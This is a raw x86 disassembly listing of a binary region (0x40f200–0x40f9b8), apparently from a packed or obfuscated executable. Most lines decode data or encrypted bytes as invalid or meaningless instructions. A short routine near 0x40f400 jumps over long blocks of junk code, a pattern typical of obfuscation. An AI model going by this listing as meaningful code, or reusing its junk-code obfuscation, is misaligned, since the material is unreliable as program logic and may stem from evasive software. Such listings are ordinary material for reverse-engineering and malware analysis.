  40f200:	mov    ?,WORD PTR [edx]
  40f202:	nop
  40f203:	mov    cl,0x22
  40f205:	out    0xae,al
  40f207:	adc    DWORD PTR [esi+0x7f],edx
  40f20a:	mov    ebx,0x797bacfc
  40f20f:	(bad)  
  40f211:	mov    ds:0xebb9d350,al
  40f216:	sub    eax,0xdadd4db6
  40f21b:	hlt    
  40f21c:	cld    
  40f21d:	inc    edx
  40f21e:	pop    ecx
  40f21f:	not    DWORD PTR [ecx+0x10]
  40f222:	xchg   esp,eax
  40f223:	mov    ebp,0x9392fc45
  40f228:	stos   DWORD PTR es:[edi],eax
  40f229:	or     ch,BYTE PTR [ecx+0x5a220b4]
  40f22f:	aam    0xb8
  40f231:	pop    ds
  40f232:	mov    ecx,0x15dbf824
  40f237:	es repz mov cl,0x6e
  40f23b:	mov    al,ds:0xfea39378
  40f240:	sbb    ecx,0xd5cbdbe6
  40f246:	jmp    0x40f2ac
  40f248:	mov    ds:0xf3f51c4,al
  40f24d:	jmp    0x9f4636e6
  40f252:	es shr ch,cl
  40f255:	push   es
  40f256:	sti    
  40f257:	repz test DWORD PTR [edi-0x6237e927],edi
  40f25e:	call   0xf52a:0x50c2c34d
  40f265:	cmp    al,0xfb
  40f267:	push   esp
  40f268:	adc    DWORD PTR [edi],edx
  40f26a:	sub    eax,0xca3a5f20
  40f26f:	(bad)  [edi-0x5e40b0]
  40f275:	retf   
  40f276:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f277:	and    al,0x3e
  40f279:	call   0x2ddcbaf7
  40f27e:	mov    esp,0x617db3ba
  40f283:	test   al,bl
  40f285:	add    cl,BYTE PTR [ebp-0x39249c17]
  40f28b:	add    eax,0x657d1a99
  40f290:	adc    DWORD PTR [esi-0x6a],ebx
  40f293:	lds    edi,FWORD PTR [eax+0x38b396fa]
  40f299:	push   DWORD PTR [eax-0x767f359a]
  40f29f:	sti    
  40f2a0:	add    esp,DWORD PTR [ecx]
  40f2a2:	jecxz  0x40f2e4
  40f2a4:	xchg   edx,eax
  40f2a5:	sub    ebx,DWORD PTR [edi+ebx*4-0x10]
  40f2a9:	jo     0x40f23c
  40f2ab:	retf   
  40f2ac:	int3   
  40f2ad:	loope  0x40f243
  40f2af:	pop    eax
  40f2b0:	add    DWORD PTR [esi],esp
  40f2b2:	jno    0x40f2af
  40f2b4:	pusha  
  40f2b5:	adc    al,0xf0
  40f2b7:	or     BYTE PTR [eax-0x636ab4db],bl
  40f2bd:	pop    edi
  40f2be:	pop    es
  40f2bf:	adc    DWORD PTR [ebx+0x4],eax
  40f2c2:	dec    esi
  40f2c3:	cmc    
  40f2c4:	lods   eax,DWORD PTR ds:[esi]
  40f2c5:	push   ds
  40f2c6:	jne    0x40f27f
  40f2c8:	fs pop ebp
  40f2ca:	sbb    dl,BYTE PTR ss:[esi-0x2bfd92a]
  40f2d1:	adc    BYTE PTR [ecx],dh
  40f2d3:	test   eax,0x562847ec
  40f2d8:	dec    esp
  40f2d9:	pop    edi
  40f2da:	or     esi,DWORD PTR [ebx-0x5e]
  40f2dd:	sbb    BYTE PTR ss:[ebx+edx*8+0x10],bl
  40f2e2:	or     bh,dh
  40f2e4:	fadd   DWORD PTR [edi]
  40f2e6:	or     eax,0x6c80968b
  40f2eb:	mov    al,0x37
  40f2ed:	aad    0x98
  40f2ef:	inc    ebp
  40f2f0:	lods   eax,DWORD PTR ds:[esi]
  40f2f1:	inc    edi
  40f2f2:	js     0x40f36f
  40f2f4:	mov    al,0xd1
  40f2f6:	lods   al,BYTE PTR ds:[esi]
  40f2f7:	push   esp
  40f2f8:	and    DWORD PTR [esi+0x5d],edi
  40f2fb:	shr    BYTE PTR [eax+0xf],0x59
  40f2ff:	sub    esp,DWORD PTR [eax+ebx*2+0x69a7ab55]
  40f306:	cli    
  40f307:	loopne 0x40f2cd
  40f309:	test   DWORD PTR ds:0x4aa00131,0x962df727
  40f313:	xchg   DWORD PTR gs:[edx+0x51],esi
  40f317:	scas   al,BYTE PTR es:[edi]
  40f318:	stos   DWORD PTR es:[edi],eax
  40f319:	mov    dh,0xb3
  40f31b:	pusha  
  40f31c:	repz push esp
  40f31e:	pop    edx
  40f31f:	cmp    BYTE PTR [ecx-0x6aad4da1],dl
  40f325:	in     eax,0x34
  40f327:	sub    BYTE PTR [eax-0x79938924],ch
  40f32d:	cmovg  ebx,eax
  40f330:	repz xor edi,DWORD PTR [esi]
  40f333:	fs jnp 0x40f383
  40f336:	cmp    edx,esi
  40f338:	loope  0x40f323
  40f33a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f33b:	adc    BYTE PTR [ecx],bl
  40f33d:	enter  0x95bb,0x20
  40f341:	mov    WORD PTR [esi-0x1e5f4f28],?
  40f347:	(bad)  [ebp+eax*1+0x57]
  40f34b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f34c:	mov    eax,0x9dce604d
  40f351:	sahf   
  40f352:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f353:	outs   dx,BYTE PTR ds:[esi]
  40f354:	jbe    0x40f347
  40f356:	or     eax,0x69bf3f60
  40f35b:	dec    edx
  40f35c:	mov    edx,0xffc756e0
  40f361:	jno    0x40f350
  40f363:	pop    esi
  40f364:	push   es
  40f365:	(bad)  
  40f366:	adc    ebp,DWORD PTR [ebp-0x50]
  40f369:	mov    dl,0xbd
  40f36b:	repz xor al,0xd2
  40f36e:	ret    0xd0f4
  40f371:	enter  0x2303,0x45
  40f375:	les    esi,FWORD PTR [ebx-0x1]
  40f378:	into   
  40f379:	pusha  
  40f37a:	imul   esi,DWORD PTR [edi-0x5ed95f0d],0xffffff98
  40f381:	fwait
  40f382:	(bad)  
  40f383:	mov    bh,0x9f
  40f385:	xchg   DWORD PTR [edi-0x5],esi
  40f388:	jp     0x40f329
  40f38a:	jmp    0x1a21:0x3d49d53a
  40f391:	xchg   esp,eax
  40f392:	jecxz  0x40f3b2
  40f394:	pop    ds
  40f395:	mov    ebx,DWORD PTR [eax-0x36e0b452]
  40f39b:	adc    al,0xe0
  40f39d:	aam    0x9d
  40f39f:	mov    ebp,DWORD PTR [edx-0x22a7e856]
  40f3a5:	test   al,0x9a
  40f3a7:	iret   
  40f3a8:	jge    0x40f365
  40f3aa:	or     cl,BYTE PTR [ebx+0x4c]
  40f3ad:	out    dx,al
  40f3ae:	mov    ah,dl
  40f3b0:	mov    eax,ds:0x10594c5e
  40f3b5:	js     0x40f359
  40f3b7:	sub    eax,0x554324fb
  40f3bc:	mov    dh,0xb3
  40f3be:	pop    eax
  40f3bf:	mov    eax,0x16cac361
  40f3c4:	sub    al,0xbe
  40f3c6:	ins    DWORD PTR es:[edi],dx
  40f3c7:	pop    ss
  40f3c8:	pushf  
  40f3c9:	ror    BYTE PTR [eax],cl
  40f3cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3cc:	pop    esi
  40f3cd:	push   esi
  40f3ce:	sti    
  40f3cf:	dec    edi
  40f3d0:	pop    ecx
  40f3d1:	jg     0x40f3e9
  40f3d3:	sub    bp,dx
  40f3d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3d7:	arpl   WORD PTR [esi-0x36ccd249],di
  40f3dd:	xchg   ecx,ecx
  40f3df:	mov    dl,0x8f
  40f3e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3e2:	sbb    BYTE PTR [ebp+esi*1-0x5a],dl
  40f3e6:	xor    al,0x27
  40f3e8:	shl    edx,0x67
  40f3eb:	jmp    0x61764dc3
  40f3f0:	mov    ds:0x9dfafcd6,al
  40f3f5:	sub    al,0x10
  40f3f7:	(bad)  
  40f3f8:	pop    esi
  40f3f9:	add    eax,ebx
  40f3fb:	pop    ebx
  40f3fc:	leave  
  40f3fd:	ret    0x8
  40f400:	push   ebp
  40f401:	mov    ebp,esp
  40f403:	push   ecx
  40f404:	mov    DWORD PTR ds:0x433727,0x6a14
  40f40e:	push   ecx
  40f40f:	xor    ecx,edx
  40f411:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40f418:	jmp    0x40f6e7
  40f41d:	call   0xa1f0:0x6df6cd0b
  40f424:	push   ebx
  40f425:	inc    ebx
  40f426:	push   edi
  40f427:	dec    ecx
  40f428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f429:	jl     0x40f3ee
  40f42b:	sub    BYTE PTR [edx-0x51],0xab
  40f42f:	jle    0x40f4af
  40f431:	lods   al,BYTE PTR ds:[esi]
  40f432:	jl     0x40f4b2
  40f434:	jle    0x40f47d
  40f436:	mov    eax,0xda3c7efc
  40f43b:	pop    esi
  40f43c:	add    BYTE PTR [ebx-0x6b],al
  40f43f:	cmp    eax,DWORD PTR [ecx-0x37d792eb]
  40f445:	pslld  mm6,QWORD PTR [ebx-0x23]
  40f449:	sbb    edx,DWORD PTR [edx-0x57e1771a]
  40f44f:	mov    ch,0x4c
  40f451:	or     BYTE PTR [eax+0x5b50a0c3],bh
  40f457:	in     eax,0x56
  40f459:	test   DWORD PTR [esi-0x5c],ecx
  40f45c:	les    esi,FWORD PTR [ebx]
  40f45e:	add    BYTE PTR [edx],al
  40f460:	add    al,0x38
  40f462:	push   esp
  40f463:	ror    DWORD PTR [ecx+0x3da7d7e4],0x5a
  40f46a:	sub    eax,0xd930b1a
  40f46f:	arpl   WORD PTR [ebp+0x78713b2b],bp
  40f475:	push   ebp
  40f476:	out    0xd1,eax
  40f478:	and    al,0x64
  40f47a:	faddp  st(0),st
  40f47c:	cmp    BYTE PTR [esi+0x18290ed7],bl
  40f482:	(bad)  
  40f483:	jb     0x40f4ac
  40f485:	xor    al,0x50
  40f487:	fst    QWORD PTR [esi]
  40f489:	add    BYTE PTR [ecx+0x4d],cl
  40f48c:	cwde   
  40f48d:	inc    ecx
  40f48e:	jge    0x40f4cd
  40f490:	dec    ebp
  40f491:	jle    0x40f4ed
  40f493:	imul   ebx,DWORD PTR [eax],0x33
  40f496:	mov    BYTE PTR [edx-0x8],0x26
  40f49a:	(bad)  
  40f49b:	rol    ah,1
  40f49d:	test   eax,0xd9c65a67
  40f4a2:	mov    ds:0xc2e17fba,al
  40f4a7:	pop    ebx
  40f4a8:	mov    ebp,0xa48fd822
  40f4ad:	and    al,0xde
  40f4af:	or     al,0x63
  40f4b1:	mov    eax,0x6b26875b
  40f4b6:	gs dec eax
  40f4b8:	popf   
  40f4b9:	fwait
  40f4ba:	div    ah
  40f4bc:	and    dh,ah
  40f4be:	or     ebp,esi
  40f4c0:	inc    ebx
  40f4c1:	mov    dh,0x53
  40f4c3:	and    eax,0x975b7885
  40f4c8:	sub    BYTE PTR [ebp+0x1f],ah
  40f4cb:	mov    ah,0x71
  40f4cd:	xchg   edx,eax
  40f4ce:	inc    edi
  40f4cf:	jnp    0x40f49e
  40f4d1:	and    BYTE PTR [edi],0x63
  40f4d4:	dec    edi
  40f4d5:	fcmovb st,st(0)
  40f4d7:	push   esp
  40f4d8:	lahf   
  40f4d9:	pop    ss
  40f4da:	imul   eax,DWORD PTR [esi-0x5d],0x4f
  40f4de:	sub    ebx,DWORD PTR [ecx-0x14f7bf1]
  40f4e4:	mov    al,0xc6
  40f4e6:	sub    ah,ah
  40f4e8:	xor    dl,bl
  40f4ea:	push   ss
  40f4eb:	repnz inc edx
  40f4ed:	into   
  40f4ee:	and    eax,0xbb3d0dc1
  40f4f3:	popa   
  40f4f4:	pop    ds
  40f4f5:	mov    eax,ds:0xbfafe73a
  40f4fa:	push   ds
  40f4fb:	sbb    BYTE PTR [edi],dh
  40f4fd:	sbb    dl,bh
  40f4ff:	cmp    BYTE PTR [edx-0x23b5db29],bh
  40f505:	sbb    al,0x9
  40f507:	jmp    0xc931c57e
  40f50c:	cld    
  40f50d:	add    ebx,DWORD PTR [eax+0x54]
  40f510:	test   eax,0x22396966
  40f515:	fcom   st(0)
  40f517:	fistp  WORD PTR [edi+edi*1-0x38a43b45]
  40f51e:	hlt    
  40f51f:	jmp    0xeadc:0x6978e718
  40f526:	jge    0x40f506
  40f528:	mov    ah,0x27
  40f52a:	push   es
  40f52b:	adc    al,ah
  40f52d:	shr    BYTE PTR [edi-0x4035a57],cl
  40f533:	aas    
  40f534:	aaa    
  40f535:	not    dl
  40f537:	sbb    eax,0xb9455173
  40f53c:	mov    ecx,0xeb586a26
  40f541:	leave  
  40f542:	jl     0x40f5be
  40f544:	call   0xbfb501ca
  40f549:	ins    DWORD PTR es:[edi],dx
  40f54a:	pop    eax
  40f54b:	or     BYTE PTR [ecx+0x50efd20d],cl
  40f551:	add    al,BYTE PTR [ecx-0x39]
  40f554:	fbld   TBYTE PTR [edx]
  40f556:	test   eax,0x9100b8cf
  40f55b:	jge    0x40f548
  40f55d:	ins    DWORD PTR es:[edi],dx
  40f55e:	dec    edi
  40f55f:	push   esi
  40f560:	sbb    ebp,ebx
  40f562:	fadd   DWORD PTR [ebp-0x1a5b7cc8]
  40f568:	int    0x11
  40f56a:	gs mov dh,0xee
  40f56d:	xor    esi,eax
  40f56f:	(bad)  
  40f570:	cvtpi2ps xmm7,QWORD PTR [ebp-0xe65c195]
  40f577:	xor    al,0x58
  40f579:	pop    esp
  40f57a:	fwait
  40f57b:	add    bl,dl
  40f57d:	and    BYTE PTR [ebx+0x6a],0x2c
  40f581:	sub    DWORD PTR [ecx-0x38cb0770],0x44d14436
  40f58b:	cmp    eax,0xd109a6a2
  40f590:	xor    DWORD PTR [ebp-0x1c7cd80],edi
  40f596:	jns    0x40f5d2
  40f598:	dec    ebp
  40f599:	push   eax
  40f59a:	(bad)  
  40f59b:	pop    ebx
  40f59c:	or     eax,0xdae50011
  40f5a1:	lods   al,BYTE PTR ds:[esi]
  40f5a2:	push   esi
  40f5a3:	add    al,0xf4
  40f5a5:	push   ds
  40f5a6:	test   eax,0x8a7ede07
  40f5ab:	sbb    BYTE PTR [ebp+0x70],bh
  40f5ae:	adc    al,0x93
  40f5b0:	rcl    DWORD PTR ss:[esi+0x12],cl
  40f5b4:	rcl    DWORD PTR [edx-0x5cac49c2],cl
  40f5ba:	lahf   
  40f5bb:	jne    0x40f592
  40f5bd:	in     eax,0x52
  40f5bf:	ja     0x40f617
  40f5c1:	sar    DWORD PTR [ecx],1
  40f5c3:	pop    ecx
  40f5c4:	push   0x6d24d2ac
  40f5c9:	adc    al,0xcb
  40f5cb:	push   ds
  40f5cc:	inc    ebp
  40f5cd:	mov    al,ds:0x55ee2b7a
  40f5d2:	icebp  
  40f5d3:	cmc    
  40f5d4:	call   0x98189224
  40f5d9:	mov    esp,0x688aa752
  40f5de:	xor    al,0x75
  40f5e0:	or     eax,0x41967ce2
  40f5e5:	push   edx
  40f5e6:	retf   
  40f5e7:	jno    0x40f5b0
  40f5e9:	std    
  40f5ea:	test   BYTE PTR [edx],ch
  40f5ec:	xor    DWORD PTR [edi-0x18],edx
  40f5ef:	add    al,ah
  40f5f1:	neg    DWORD PTR ds:0x106806d7
  40f5f7:	cmp    BYTE PTR [eax+0x325ecb39],cl
  40f5fd:	cld    
  40f5fe:	dec    ebp
  40f5ff:	out    0x89,eax
  40f601:	popa   
  40f602:	std    
  40f603:	loope  0x40f5ae
  40f605:	outs   dx,BYTE PTR ds:[esi]
  40f606:	dec    esi
  40f607:	enter  0xc1cd,0xb2
  40f60b:	das    
  40f60c:	xchg   ecx,eax
  40f60d:	mov    ebx,0x8d1185a5
  40f612:	push   esi
  40f613:	sti    
  40f614:	inc    ebx
  40f615:	loopne 0x40f61c
  40f617:	inc    ecx
  40f618:	ret    
  40f619:	inc    ebx
  40f61a:	xchg   BYTE PTR [eax+edx*2+0x2e],dl
  40f61e:	pop    eax
  40f61f:	cld    
  40f620:	mov    ds:0x9f426457,eax
  40f625:	out    dx,al
  40f626:	icebp  
  40f627:	ins    DWORD PTR es:[edi],dx
  40f628:	repnz xor dh,BYTE PTR [ebp+0x5f0bcd19]
  40f62f:	rcr    DWORD PTR [eax+0x74],1
  40f632:	dec    ebx
  40f633:	xchg   edx,eax
  40f634:	enter  0x70a9,0xc3
  40f638:	scas   al,BYTE PTR es:[edi]
  40f639:	lods   eax,DWORD PTR ds:[esi]
  40f63a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f63b:	mov    ebx,0xec54d554
  40f640:	push   esi
  40f641:	inc    ebp
  40f642:	xlat   BYTE PTR ds:[ebx]
  40f643:	mov    dh,0x55
  40f645:	hlt    
  40f646:	out    0xe4,al
  40f648:	xchg   esi,eax
  40f649:	dec    eax
  40f64a:	jmp    0x40f5d0
  40f64c:	push   cs
  40f64d:	jmp    0xe9fd:0xcd110db8
  40f654:	mov    al,ds:0xd36309f
  40f659:	sbb    al,0xf
  40f65b:	lods   eax,DWORD PTR ds:[esi]
  40f65c:	xlat   BYTE PTR ds:[ebx]
  40f65d:	push   ecx
  40f65e:	clc    
  40f65f:	retf   
  40f660:	loope  0x40f666
  40f662:	cld    
  40f663:	cmp    ah,BYTE PTR [edi+0x64]
  40f666:	ss mov esp,0xf3cb7b3e
  40f66c:	mov    ebp,0xe55cc875
  40f671:	sbb    DWORD PTR [ebp+edx*8+0x754f5de5],esp
  40f678:	mov    al,0xe3
  40f67a:	inc    edx
  40f67b:	xor    eax,0xa13a2fad
  40f680:	jbe    0x40f69f
  40f682:	pop    ebp
  40f683:	or     eax,0xd236976b
  40f688:	out    0x28,al
  40f68a:	mov    cs,WORD PTR [edx-0x3c07c0a2]
  40f690:	bound  esp,QWORD PTR [edi+edi*4-0x757a5ccb]
  40f697:	pop    es
  40f698:	jl     0x40f642
  40f69a:	adc    DWORD PTR [ebx+0x26],0x11d3dfc6
  40f6a1:	pop    edx
  40f6a2:	call   FWORD PTR [eax+ecx*8+0x233019e3]
  40f6a9:	pusha  
  40f6aa:	stos   BYTE PTR es:[edi],al
  40f6ab:	in     eax,dx
  40f6ac:	mov    esp,0x93d6586
  40f6b1:	mov    ah,BYTE PTR [eax+0x7f]
  40f6b4:	push   es
  40f6b5:	lds    ebp,FWORD PTR [ebx-0x63]
  40f6b8:	sub    ch,bh
  40f6ba:	mov    bl,0x12
  40f6bc:	xor    esp,DWORD PTR [ebx]
  40f6be:	(bad)  
  40f6bf:	dec    ebx
  40f6c0:	test   BYTE PTR [esi],al
  40f6c2:	add    al,0x4a
  40f6c4:	mov    dl,0xd9
  40f6c6:	mov    ecx,0x68ee2df6
  40f6cb:	jle    0x40f6c9
  40f6cd:	ret    0xea2a
  40f6d0:	in     al,0x29
  40f6d2:	das    
  40f6d3:	sar    BYTE PTR [edx],1
  40f6d5:	int    0xd2
  40f6d7:	dec    ebx
  40f6d8:	xor    cl,0xea
  40f6db:	fadd   DWORD PTR [esi+0x18]
  40f6de:	test   DWORD PTR [ebp-0x519566c3],esp
  40f6e4:	shl    ebp,1
  40f6e6:	iret   
  40f6e7:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f6ee:	sub    DWORD PTR ds:0x433727,0x5c72
  40f6f8:	mov    eax,DWORD PTR [ebp-0x4]
  40f6fb:	add    DWORD PTR ds:0x4336e7,0x767c
  40f705:	jmp    0x40f9d4
  40f70a:	ins    BYTE PTR es:[edi],dx
  40f70b:	xchg   BYTE PTR [eax+0x70d870dc],ah
  40f711:	xchg   esi,eax
  40f712:	in     eax,0xdf
  40f714:	or     eax,ebp
  40f716:	adc    BYTE PTR [edi+ecx*4+0x51],dl
  40f71a:	fnsave [esi+0x7cac7e7e]
  40f720:	jle    0x40f7a0
  40f722:	adc    eax,0xffffffef
  40f725:	aas    
  40f726:	repnz sbb DWORD PTR [ecx],edx
  40f729:	iret   
  40f72a:	or     ch,BYTE PTR [esi+0x1d6ed24d]
  40f730:	mov    al,ds:0xf6f0a727
  40f736:	sub    ebp,0x50c0dc70
  40f73c:	dec    edx
  40f73d:	ret    0x1639
  40f740:	dec    ecx
  40f741:	(bad)  
  40f742:	rol    esp,1
  40f744:	pop    edx
  40f745:	sbb    edx,eax
  40f747:	or     ecx,esi
  40f749:	fdivp  st(7),st
  40f74b:	hlt    
  40f74c:	lock int3 
  40f74e:	std    
  40f74f:	aaa    
  40f750:	push   edx
  40f751:	and    al,BYTE PTR [eax-0x3a]
  40f754:	inc    eax
  40f755:	sub    BYTE PTR [eax+0x59],cl
  40f758:	(bad)
  40f75c:	lea    ebp,[esi-0x6a]
  40f75f:	ret    0x80a4
  40f762:	adc    BYTE PTR [ecx+0x74],bh
  40f765:	mov    DWORD PTR [ebx+0x113c38c],0x3911a7e2
  40f76f:	inc    esi
  40f770:	ret    
  40f771:	mov    edi,0x7c49e80
  40f776:	xchg   esi,eax
  40f777:	or     al,0xe9
  40f779:	jecxz  0x40f720
  40f77b:	pop    ds
  40f77c:	or     eax,0xfb657cc0
  40f781:	or     al,0x49
  40f783:	fs (bad) 
  40f785:	test   DWORD PTR [edx-0x47],eax
  40f788:	jb     0x40f794
  40f78a:	push   0x1bca7a18
  40f78f:	pushf  
  40f790:	mov    ah,0x55
  40f792:	pop    ss
  40f793:	(bad)  
  40f794:	imul   BYTE PTR [esi]
  40f796:	or     DWORD PTR [eax-0x7b],ebx
  40f799:	test   DWORD PTR [eax-0x4340db2b],edx
  40f79f:	ja     0x40f7e8
  40f7a1:	mul    dl
  40f7a3:	pop    ds
  40f7a4:	push   ecx
  40f7a5:	jmp    0xae13:0xf34ef125
  40f7ac:	xchg   ecx,eax
  40f7ad:	pusha  
  40f7ae:	jmp    0x402b4442
  40f7b3:	mov    cl,0x83
  40f7b5:	jge    0x40f82b
  40f7b7:	(bad)  
  40f7b8:	mov    DWORD PTR [ebx-0x476b9793],edx
  40f7be:	call   edi
  40f7c0:	add    eax,0x2b0d49f0
  40f7c5:	mov    ss,edi
  40f7c7:	in     eax,0xd4
  40f7c9:	pop    edx
  40f7ca:	mov    cl,0xe1
  40f7cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7cd:	repz inc eax
  40f7cf:	cwde   
  40f7d0:	xchg   ecx,eax
  40f7d1:	ja     0x40f7f5
  40f7d3:	dec    esi
  40f7d4:	cmp    DWORD PTR [edx+0x16],ecx
  40f7d7:	mov    ebx,DWORD PTR [edx-0x51]
  40f7da:	dec    esp
  40f7db:	inc    edx
  40f7dc:	cmp    esi,edx
  40f7de:	mov    cl,BYTE PTR ds:0xce5c9bbb
  40f7e4:	inc    esp
  40f7e5:	push   ebx
  40f7e6:	stos   DWORD PTR es:[edi],eax
  40f7e7:	mov    edi,0xdf7d2584
  40f7ec:	sub    esp,DWORD PTR [ebp+0x2fd38c95]
  40f7f2:	scas   al,BYTE PTR es:[edi]
  40f7f3:	adc    BYTE PTR [ebx],0xe4
  40f7f6:	jmp    0x435431c
  40f7fb:	cwde   
  40f7fc:	add    bh,BYTE PTR [edi]
  40f7fe:	mov    ah,0x6b
  40f800:	cmp    DWORD PTR [edx],0x9c28bb2
  40f806:	add    al,0xdb
  40f808:	fwait
  40f809:	cs in  al,0xae
  40f80c:	arpl   WORD PTR [ebx],cx
  40f80e:	scas   eax,DWORD PTR es:[edi]
  40f80f:	push   edx
  40f810:	call   0x8cf1d3e2
  40f815:	out    0x4,al
  40f817:	repz adc BYTE PTR [esi],al
  40f81a:	jle    0x40f82e
  40f81c:	test   al,0x2e
  40f81f:	ror    BYTE PTR [esi-0x6a7b0c7d],1
  40f825:	and    al,0xe8
  40f827:	hlt    
  40f828:	pop    ebx
  40f829:	or     BYTE PTR [eax],dh
  40f82b:	call   0xb0095e84
  40f830:	repnz or edi,DWORD PTR [ebp+ebx*1+0x3d]
  40f835:	inc    edx
  40f836:	leave  
  40f837:	and    esp,DWORD PTR [edi-0x47]
  40f83a:	inc    ebx
  40f83b:	lods   al,BYTE PTR ds:[esi]
  40f83c:	jbe    0x40f880
  40f83e:	repnz scas eax,DWORD PTR es:[edi]
  40f840:	(bad)
  40f843:	dec    ecx
  40f844:	bound  eax,QWORD PTR [esi]
  40f846:	dec    esi
  40f847:	test   ecx,edi
  40f849:	clc    
  40f84a:	cwde   
  40f84b:	mov    bh,dh
  40f84d:	or     DWORD PTR [esi+0x466bb650],esi
  40f853:	(bad)  
  40f855:	xor    al,bl
  40f857:	cmp    al,BYTE PTR [edx+0x33]
  40f85a:	and    eax,0x7bfba7cd
  40f85f:	jg     0x40f87e
  40f861:	xchg   edi,eax
  40f862:	stc    
  40f863:	xor    al,0xb4
  40f865:	and    bl,al
  40f867:	or     al,0x93
  40f869:	das    
  40f86a:	hlt    
  40f86b:	pop    ds
  40f86c:	gs and al,0x4c
  40f86f:	mov    ah,BYTE PTR [ecx]
  40f871:	mov    ds:0x8c934faf,eax
  40f876:	dec    ebp
  40f877:	and    esi,DWORD PTR [ecx+0x6c]
  40f87a:	dec    eax
  40f87b:	dec    esp
  40f87c:	in     al,0x7d
  40f87e:	mov    esp,0x827412ea
  40f883:	imul   ebp,DWORD PTR [ebx-0x573686a7],0x5b
  40f88a:	inc    esi
  40f88b:	inc    ecx
  40f88c:	imul   DWORD PTR [eax]
  40f88e:	inc    esi
  40f88f:	stos   BYTE PTR es:[edi],al
  40f890:	and    DWORD PTR [esi-0x571cbfa],ecx
  40f896:	jl     0x40f8f3
  40f898:	dec    ebp
  40f899:	jno    0x40f84e
  40f89b:	sar    ch,0xd3
  40f89e:	add    eax,0xeb98a8c1
  40f8a3:	mov    al,ds:0xcda0bc62
  40f8a8:	popf   
  40f8a9:	ret    
  40f8aa:	and    DWORD PTR [edi+0x4f17e700],0xffffffdf
  40f8b1:	ret    
  40f8b2:	adc    al,0x5e
  40f8b4:	mov    cl,0xd1
  40f8b6:	mov    bl,0x33
  40f8b8:	mov    edx,0x12c15549
  40f8bd:	add    bl,al
  40f8bf:	test   BYTE PTR gs:[esp+ebp*8+0x482f4fe3],bl
  40f8c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8c8:	sbb    al,0xee
  40f8ca:	in     al,dx
  40f8cb:	add    BYTE PTR [eax-0x4db62779],ch
  40f8d1:	ret    
  40f8d2:	rol    ecx,1
  40f8d4:	nop
  40f8d5:	mov    eax,0xffac1a43
  40f8da:	enter  0x5301,0xf9
  40f8de:	xchg   edi,eax
  40f8df:	xchg   DWORD PTR [edx],edx
  40f8e1:	xchg   esp,eax
  40f8e2:	inc    esp
  40f8e3:	xor    DWORD PTR [edi],ecx
  40f8e5:	and    dl,BYTE PTR [edx+edx*8-0x27]
  40f8e9:	pop    ecx
  40f8ea:	ja     0x40f86f
  40f8ec:	and    al,0xda
  40f8ee:	lock test BYTE PTR [edi-0x17460b8b],dl
  40f8f5:	test   cl,0x11
  40f8f8:	lea    eax,[edi+0x6bbe4b12]
  40f8fe:	cwde   
  40f8ff:	inc    ecx
  40f900:	sahf   
  40f901:	push   es
  40f902:	std    
  40f903:	pop    es
  40f904:	sbb    ebx,DWORD PTR [ebx+0x6e5bb827]
  40f90a:	(bad)  
  40f90c:	push   eax
  40f90d:	fdiv   st,st(1)
  40f90f:	xchg   dl,dl
  40f911:	cdq    
  40f912:	jnp    0x40f8f6
  40f914:	xchg   esi,eax
  40f915:	push   0xd148e4eb
  40f91a:	dec    al
  40f91c:	mov    ah,0x89
  40f91e:	sbb    DWORD PTR [bx],eax
  40f921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f923:	and    dh,BYTE PTR [esp+ebp*1]
  40f926:	or     eax,0xf1693da6
  40f92b:	push   ebx
  40f92c:	repnz pop ss
  40f92e:	mov    bh,0x87
  40f930:	xchg   bl,dl
  40f932:	sbb    al,0x2f
  40f934:	xlat   BYTE PTR ds:[ebx]
  40f935:	jp     0x40f908
  40f937:	lods   al,BYTE PTR ds:[esi]
  40f938:	xor    DWORD PTR [ebx],ebx
  40f93a:	or     BYTE PTR [ebp+0x23],ch
  40f93d:	(bad)  
  40f93e:	icebp  
  40f93f:	je     0x40f9a7
  40f941:	dec    ebx
  40f942:	xchg   edi,eax
  40f943:	in     eax,0x5c
  40f945:	lods   eax,DWORD PTR ds:[esi]
  40f946:	jnp    0x40f951
  40f948:	(bad)  
  40f949:	retf   0x57ee
  40f94c:	lahf   
  40f94d:	push   edi
  40f94e:	ret    
  40f94f:	imul   esp,DWORD PTR [ecx+0x4e2b5bb5],0x7a
  40f956:	in     al,0x65
  40f958:	scas   al,BYTE PTR es:[edi]
  40f959:	and    DWORD PTR [edi-0x59],eax
  40f95c:	into   
  40f95d:	and    DWORD PTR [ebp+0x3a],edi
  40f960:	arpl   ax,bp
  40f962:	inc    ecx
  40f963:	ror    BYTE PTR [eax],0x96
  40f966:	add    BYTE PTR [edi-0x2eb91ca6],bh
  40f96c:	ja     0x40f97b
  40f96e:	pop    ds
  40f96f:	jle    0x40f972
  40f971:	mov    ds:0xfadb81a7,eax
  40f976:	push   ss
  40f977:	xchg   BYTE PTR [ecx+0x50e07156],al
  40f97d:	dec    ebp
  40f97e:	ret    0x4ce9
  40f981:	push   0x66518696
  40f986:	cli    
  40f987:	sbb    ebx,ebx
  40f989:	out    0xa0,al
  40f98b:	push   eax
  40f98c:	das    
  40f98d:	sub    al,0xa3
  40f98f:	xor    cl,BYTE PTR [edi*8-0x274c3535]
  40f996:	shl    BYTE PTR [ebx],0xc8
  40f999:	mov    eax,ds:0xf0206a92
  40f99e:	shl    DWORD PTR [ebx-0x48ad2d19],1
  40f9a4:	cdq    
  40f9a5:	pop    ebx
  40f9a6:	lea    eax,[ecx-0x67]
  40f9a9:	or     esi,DWORD PTR [edx-0x1b89bbc0]
  40f9af:	js     0x40fa1a
  40f9b1:	fs xor eax,0x51a9ae2e
  40f9b7:	push   eax
  40f9b8:	or     edi,ebp
